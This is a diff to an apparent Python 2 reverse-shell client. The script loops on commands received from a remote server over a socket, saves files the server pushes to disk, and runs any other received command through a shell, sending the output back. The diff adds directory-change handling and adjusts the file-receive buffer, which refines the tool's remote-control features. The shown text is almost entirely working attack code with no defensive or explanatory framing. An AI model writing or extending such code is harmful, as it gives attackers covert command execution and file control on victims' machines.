@@ -20,6 +20,9 @@ def connect():
 def main():
     while True:
         srv_cmd = s.recv(1024)
+        split = srv_cmd.split(" ")
+        cd = split[0]
+        path = split[-1]
         if srv_cmd == "quit":
             print "[-] Interactive Mode Disabled"
         elif srv_cmd == "disconnect":
@@ -39,18 +42,23 @@ def main():
             word_l = namef.split("/")
             filename = word_l[-1]
             print "[+] Filename: ", filename
-            data_f = s.recv(4096)
-            rcv_f = open(filename, "wb+")
+            data_f = s.recv(10000)
+            rcv_f = open(filename, "wb")
             rcv_f.write(data_f) 
             rcv_f.close()
-            print "[+] Retrieved File: ", data_f
+            print "[+] Retrieved File"
+        # Change Directory
         # Interactive Shell
         else:
-            cmd = subprocess.Popen(srv_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-
-            output = cmd.stdout.read() + cmd.stderr.read()
-            s.send(output)
-            cmd.terminate()
+            if cd == "cd":
+                print "[+] Current Directory: ", os.getcwd()
+                os.chdir(path)
+                print "[+] New Directory: ", os.getcwd()
+            else:
+                cmd = subprocess.Popen(srv_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                output = cmd.stdout.read() + cmd.stderr.read()
+                s.send(output)
+                cmd.terminate()
 
     s.close()
 
